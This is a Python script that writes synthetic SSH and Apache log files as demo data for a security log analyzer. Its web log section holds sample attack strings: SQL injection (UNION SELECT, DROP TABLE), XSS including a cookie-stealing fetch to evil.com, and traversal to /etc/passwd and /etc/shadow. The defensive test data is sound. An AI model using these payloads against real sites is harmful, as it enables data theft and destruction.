"""
generate_sample_logs.py — Creates realistic demo log files in data/

Run:  python generate_sample_logs.py

Generates two files:
  data/sample_auth.log    — SSH login events (normal users + brute-force attack)
  data/sample_access.log  — Web requests (normal traffic + SQLi, XSS, scanner)

Having built-in demo data means anyone cloning the repo can immediately
try the tool without needing a real server.
"""

import random
import os
from datetime import datetime, timedelta

random.seed(42)                  # fixed seed = reproducible output
os.makedirs('data', exist_ok=True)

# ── Shared helpers ────────────────────────────────────────────────────────────

def rand_ts(base: datetime, jitter_seconds: int = 3600) -> datetime:
    """Return base + a random number of seconds up to jitter_seconds."""
    return base + timedelta(seconds=random.randint(0, jitter_seconds))

def fmt_auth(ts: datetime, host: str, msg: str) -> str:
    """Format a syslog-style auth log line."""
    return ts.strftime(f'%b %d %H:%M:%S') + f' {host} {msg}'

def fmt_web(ip: str, ts: datetime, method: str, path: str,
            status: int, size: int, agent: str) -> str:
    """Format an Apache combined-log-format line."""
    ts_str = ts.strftime('%d/%b/%Y:%H:%M:%S +0000')
    return f'{ip} - - [{ts_str}] "{method} {path} HTTP/1.1" {status} {size} "-" "{agent}"'


# ── Auth log generation ───────────────────────────────────────────────────────

def gen_auth_log(path: str):
    """
    Writes ~600 SSH auth log lines mixing:
      - Normal users (few logins, business hours, success)
      - One brute-force attacker (many rapid failures, odd hours)
      - One credential stuffer (many usernames from one IP)
    """
    lines   = []
    base_ts = datetime(2025, 1, 10, 8, 0, 0)   # 8 AM on Jan 10 2025
    host    = 'webserver01'

    # ── Normal users (3 IPs, occasional logins through the day) ──────────────
    normal_ips   = ['203.0.113.10', '203.0.113.20', '203.0.113.30']
    normal_users = ['alice', 'bob', 'carol']

    for ip, user in zip(normal_ips, normal_users):
        for _ in range(random.randint(2, 5)):
            ts = rand_ts(base_ts, 28800)   # spread over 8 hours
            lines.append((ts, fmt_auth(ts, host, f'sshd[{random.randint(1000,9999)}]: '
                f'Accepted password for {user} from {ip} port {random.randint(40000,65000)} ssh2')))
        # one failed attempt (mistyped password)
        ts = rand_ts(base_ts, 28800)
        lines.append((ts, fmt_auth(ts, host, f'sshd[{random.randint(1000,9999)}]: '
            f'Failed password for {user} from {ip} port {random.randint(40000,65000)} ssh2')))

    # ── Brute-force attacker: 150 rapid failures at 3 AM ─────────────────────
    attacker_ip = '198.51.100.99'
    attack_ts   = datetime(2025, 1, 10, 3, 0, 0)
    common_users = ['root', 'admin', 'ubuntu', 'user', 'test', 'guest', 'oracle']

    for i in range(150):
        ts   = attack_ts + timedelta(seconds=i * 2)   # one attempt every 2 seconds
        user = random.choice(common_users)
        lines.append((ts, fmt_auth(ts, host, f'sshd[{random.randint(1000,9999)}]: '
            f'Failed password for {user} from {attacker_ip} port {random.randint(40000,65000)} ssh2')))

    # ── Credential stuffer: one IP, 10 different usernames ───────────────────
    stuffer_ip    = '192.0.2.55'
    stuffer_users = ['john', 'jane', 'mike', 'sara', 'david', 'lisa', 'james', 'anna', 'tom', 'kate']
    stuff_ts      = datetime(2025, 1, 10, 2, 0, 0)

    for i, user in enumerate(stuffer_users):
        ts = stuff_ts + timedelta(minutes=i * 3)
        lines.append((ts, fmt_auth(ts, host, f'sshd[{random.randint(1000,9999)}]: '
            f'Failed password for invalid user {user} from {stuffer_ip} port {random.randint(40000,65000)} ssh2')))

    # Sort chronologically and write
    lines.sort(key=lambda x: x[0])
    with open(path, 'w') as f:
        f.write('\n'.join(line for _, line in lines) + '\n')

    print(f'[+] Wrote {len(lines)} lines -> {path}')


# ── Web log generation ────────────────────────────────────────────────────────

def gen_web_log(path: str):
    """
    Writes ~700 Apache access log lines mixing:
      - Normal web browsing traffic
      - SQL injection attempts
      - XSS attempts
      - Directory traversal
      - Automated path scanner (many 404s)
    """
    lines   = []
    base_ts = datetime(2025, 1, 10, 8, 0, 0)
    agent   = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    # ── Normal traffic (several IPs, normal pages) ────────────────────────────
    normal_ips   = ['10.0.0.1', '10.0.0.2', '10.0.0.3', '10.0.0.4', '10.0.0.5']
    normal_paths = ['/index.html', '/about.html', '/products', '/contact',
                    '/api/users', '/api/products', '/login', '/dashboard', '/static/app.js']

    for ip in normal_ips:
        for _ in range(random.randint(20, 40)):
            ts   = rand_ts(base_ts, 28800)
            rpath = random.choice(normal_paths)
            lines.append((ts, fmt_web(ip, ts, 'GET', rpath, 200, random.randint(500, 5000), agent)))

    # ── SQL injection attacker ────────────────────────────────────────────────
    sqli_ip      = '172.16.0.99'
    sqli_payloads = [
        "/login.php?user=admin'--&pass=x",
        "/products?id=1 UNION SELECT username,password FROM users--",
        "/search?q=1' OR '1'='1",
        "/api/item?id=1; DROP TABLE users--",
        "/login?user=admin' AND 1=1--",
        "/api/data?id=1 AND sleep(5)--",
        "/page?id=' OR 1=1 LIMIT 1--",
    ]
    sqli_ts = datetime(2025, 1, 10, 1, 30, 0)
    for i in range(40):
        ts      = sqli_ts + timedelta(seconds=i * 10)
        payload = random.choice(sqli_payloads)
        lines.append((ts, fmt_web(sqli_ip, ts, 'GET', payload, 500, 0, agent)))

    # ── XSS attacker ─────────────────────────────────────────────────────────
    xss_ip       = '172.16.0.77'
    xss_payloads = [
        '/search?q=<script>alert(document.cookie)</script>',
        '/comment?text=<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
        '/name?v="><img src=x onerror=alert(1)>',
        '/page?title=<svg onload=alert(1)>',
    ]
    xss_ts = datetime(2025, 1, 10, 2, 0, 0)
    for i in range(20):
        ts      = xss_ts + timedelta(seconds=i * 15)
        payload = random.choice(xss_payloads)
        lines.append((ts, fmt_web(xss_ip, ts, 'GET', payload, 200, 300, agent)))

    # ── Directory traversal ───────────────────────────────────────────────────
    trav_ip       = '10.10.10.10'
    trav_payloads = [
        '/download?file=../../etc/passwd',
        '/view?path=../../../etc/shadow',
        '/img?src=....//....//etc/passwd',
        '/file?name=%2e%2e%2fetc%2fpasswd',
    ]
    trav_ts = datetime(2025, 1, 10, 4, 0, 0)
    for i in range(15):
        ts      = trav_ts + timedelta(seconds=i * 20)
        payload = random.choice(trav_payloads)
        lines.append((ts, fmt_web(trav_ip, ts, 'GET', payload, 403, 0, agent)))

    # ── Scanner (many 404s in rapid succession) ───────────────────────────────
    scanner_ip    = '192.168.99.1'
    scanner_agent = 'Nikto/2.1.6'   # Nikto is a well-known web vulnerability scanner
    scanner_paths = [
        '/admin', '/wp-login.php', '/phpmyadmin', '/.env', '/config.php',
        '/backup.zip', '/robots.txt', '/server-status', '/shell.php',
        '/.git/config', '/api/v1/admin', '/manager/html', '/actuator',
        '/console', '/debug', '/.htaccess', '/wp-admin', '/xmlrpc.php',
    ]
    scan_ts = datetime(2025, 1, 10, 5, 0, 0)
    for i in range(60):
        ts      = scan_ts + timedelta(seconds=i)   # one request per second
        spath   = random.choice(scanner_paths)
        lines.append((ts, fmt_web(scanner_ip, ts, 'GET', spath, 404, 0, scanner_agent)))

    lines.sort(key=lambda x: x[0])
    with open(path, 'w') as f:
        f.write('\n'.join(line for _, line in lines) + '\n')

    print(f'[+] Wrote {len(lines)} lines -> {path}')


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == '__main__':
    gen_auth_log('data/sample_auth.log')
    gen_web_log('data/sample_access.log')
    print('\n[+] Sample logs ready. Run:')
    print('      python cli.py analyze data/sample_auth.log')
    print('      python cli.py analyze data/sample_access.log')
    print('      python run_web.py   -> open http://localhost:5000')
